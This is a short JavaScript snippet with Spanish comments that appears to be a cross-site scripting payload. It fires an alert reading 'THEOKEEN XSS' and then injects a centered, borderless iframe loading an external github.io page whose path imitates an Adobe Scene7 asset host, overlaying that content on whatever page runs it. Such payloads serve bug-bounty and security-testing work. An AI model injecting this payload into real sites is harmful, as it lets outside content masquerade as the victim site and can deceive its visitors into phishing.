// Crear un iframe
var iframe = document.createElement('iframe');
alert("THEOKEEN XSS")
// Configurar el iframe
iframe.src = 'https://snowflakelabs.github.io/_s7d6_scene7_com/index.html'; // URL del iframe
iframe.width = '800'; // Ancho del iframe
iframe.height = '600'; // Altura del iframe
iframe.style.position = 'absolute';
iframe.style.top = '50%';
iframe.style.left = '50%';
iframe.style.transform = 'translate(-50%, -50%)'; // Centra el iframe
iframe.style.border = 'none'; // Sin bordes

// Agregar el iframe al cuerpo de la página
document.body.appendChild(iframe);
